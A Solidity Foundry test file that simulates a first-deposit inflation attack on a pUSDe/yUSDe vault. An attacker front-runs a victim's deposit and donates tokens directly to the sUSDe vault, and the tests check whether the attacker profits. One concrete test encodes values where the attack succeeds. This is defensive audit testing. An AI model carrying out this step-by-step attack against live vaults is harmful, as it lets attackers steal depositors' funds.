pragma solidity 0.8.28;
import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {MockUSDe} from "../contracts/test/MockUSDe.sol";
import {MockStakedUSDe} from "../contracts/test/MockStakedUSDe.sol";
import {MockERC4626} from "../contracts/test/MockERC4626.sol";
import {PreDepositVault} from "../contracts/predeposit/PreDepositVault.sol";
import {pUSDeVault} from "../contracts/predeposit/pUSDeVault.sol";
import {yUSDeVault} from "../contracts/predeposit/yUSDeVault.sol";
import {console2} from "forge-std/console2.sol";

contract FirstDepositTest is Test {
    MockUSDe public USDe;
    MockStakedUSDe public sUSDe;
    pUSDeVault public pUSDe;
    yUSDeVault public yUSDe;
    address account;
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");
    function setUp() public {
        address owner = msg.sender;
        USDe = new MockUSDe();
        sUSDe = new MockStakedUSDe(USDe, owner, owner);
        pUSDe = pUSDeVault(
        address(
        new ERC1967Proxy(
        address(new pUSDeVault()),
        abi.encodeWithSelector(pUSDeVault.initialize.selector, owner, USDe, sUSDe)
        )
        )
        );
        yUSDe = yUSDeVault(
        address(
        new ERC1967Proxy(
        address(new yUSDeVault()),
        abi.encodeWithSelector(yUSDeVault.initialize.selector, owner, USDe, sUSDe, pUSDe)
        )
        )
        );
        vm.startPrank(owner);
        pUSDe.setDepositsEnabled(true);
        pUSDe.setWithdrawalsEnabled(true);
        pUSDe.updateYUSDeVault(address(yUSDe));
    }
    function test_firstDepositAttack_fuzz(
    uint128 userDeposit,
    uint128 attackerDeposit,
    uint128 attackerDirectTransfer,
    uint128 initialAdminTransferAmount
    ) external {
    // Assume deposits will not exceed 10 million USDe
    uint256 depositUpperBound = 10_000_000e18; // 10 million USDe
    userDeposit = uint128(bound(userDeposit, 1e18, depositUpperBound));
    attackerDeposit = uint128(bound(attackerDeposit, 1e18, depositUpperBound));
    // Assume the attacker has access to unlimited USDe for the attack via flash loans
    attackerDirectTransfer = uint128(bound(attackerDirectTransfer, 1e18, type(uint128).max));
    // Assume the initial admin transfer amount is between 1 wei and 1 ether
    initialAdminTransferAmount = uint128(bound(initialAdminTransferAmount, 1, 1000 ether));
    // Require a 0.5% profit margin for the attack to be considered successful
    uint256 attackerProfitMargin = 10_050;
    test_firstDepositAttack_base(userDeposit, attackerDeposit, attackerDirectTransfer, initialAdminTransferAmount);
    // verify attacker did not make a profit
    assertGe(
    (uint256(attackerDeposit) + attackerDirectTransfer) * attackerProfitMargin / 10_000,
    sUSDe.maxWithdraw(attacker),
    "Attacker made a profit"
    );
    }
    function test_firstDepositAttack_concrete() public {
        uint128 userDeposit = 1000000000000000002;
        uint128 attackerDeposit = 1000000000000000001;
        uint128 attackerDirectTransfer = 1000000000000000003;
        uint128 initialAdminTransferAmount = 45958188162046142928;
        test_firstDepositAttack_base(userDeposit, attackerDeposit, attackerDirectTransfer, initialAdminTransferAmount);
        assertGt(
        sUSDe.maxWithdraw(attacker),
        uint256(attackerDeposit) + attackerDirectTransfer,
        "Attacker did not make a profit"
        );
        console2.log("Attacker profit: %s", sUSDe.maxWithdraw(attacker) - (uint256(attackerDeposit) + attackerDirectTransfer));
    }
    function test_firstDepositAttack_base(
    uint128 userDeposit,
    uint128 attackerDeposit,
    uint128 attackerDirectTransfer,
    uint128 initialAdminTransferAmount
    ) internal {
        // fund users
        USDe.mint(victim, userDeposit);
        uint256 totalAttackerDeposit = uint256(attackerDeposit) + attackerDirectTransfer;
        USDe.mint(attacker, totalAttackerDeposit);
        // attacker deposit into pUSDe
        vm.startPrank(attacker);
        USDe.approve(address(pUSDe), attackerDeposit);
        pUSDe.deposit(address(USDe), attackerDeposit, attacker);
        vm.stopPrank();
        // innocent user deposit into pUSDe
        vm.startPrank(victim);
        USDe.approve(address(pUSDe), userDeposit);
        pUSDe.deposit(address(USDe), userDeposit, victim);
        vm.stopPrank();
        // phase change
        account = msg.sender;

        vm.startPrank(account);
        USDe.mint(account, initialAdminTransferAmount);
        USDe.approve(address(pUSDe), initialAdminTransferAmount);
        pUSDe.deposit(initialAdminTransferAmount, account);

        // Enable deposits before YieldPhase,
        yUSDe.setDepositsEnabled(true);

        // Deposit initial pUSDe to yUSDeVault
        pUSDe.approve(address(yUSDe), pUSDe.balanceOf(account));
        yUSDe.deposit(pUSDe.balanceOf(account), account);
        assertTrue(yUSDe.totalSupply() > 0, "Empty supply");

        // If everything is Okay, start the yield phase
        pUSDe.startYieldPhase();

        // vm.startPrank(account);
        // USDe.mint(account, initialAdminTransferAmount);
        // USDe.approve(address(pUSDe), initialAdminTransferAmount);
        // pUSDe.deposit(initialAdminTransferAmount, address(yUSDe));
        // pUSDe.startYieldPhase();
        // yUSDe.setDepositsEnabled(true);
        yUSDe.setWithdrawalsEnabled(true);

        vm.stopPrank();
        // attacker front-runs first deposit by innocent user to:
        // 1) make an initial deposit
        vm.startPrank(attacker);
        pUSDe.approve(address(yUSDe), attackerDeposit);
        yUSDe.deposit(attackerDeposit, attacker);
        // 2) transfer a large amount of USDe tokens directly into the sUSDe vault
        USDe.transfer(address(sUSDe), attackerDirectTransfer);
        vm.stopPrank();
        // 3) innocent user's deposit then goes through

        vm.startPrank(victim);
        pUSDe.approve(address(yUSDe), pUSDe.balanceOf(victim));
        yUSDe.deposit(pUSDe.balanceOf(victim), victim);
        vm.stopPrank();
        //assertEq(yUSDe.balanceOf(victim), 0, "Innocent user should have yUSDe shares after deposit");
        console2.log("user balance: %s", yUSDe.balanceOf(victim));
        console2.log("attacker balance: %s", yUSDe.balanceOf(attacker));
        // 4) attacker redeems their shares
        vm.startPrank(attacker);
        try yUSDe.redeem(yUSDe.balanceOf(attacker), attacker, attacker) returns (uint256) {

        } catch (bytes memory reason) {
            if (bytes4(reason) == PreDepositVault.MinSharesViolation.selector) {
            console2.log("Attacker failed to redeem shares due to min shares violation");
            }
        }
        vm.stopPrank();
    }
}
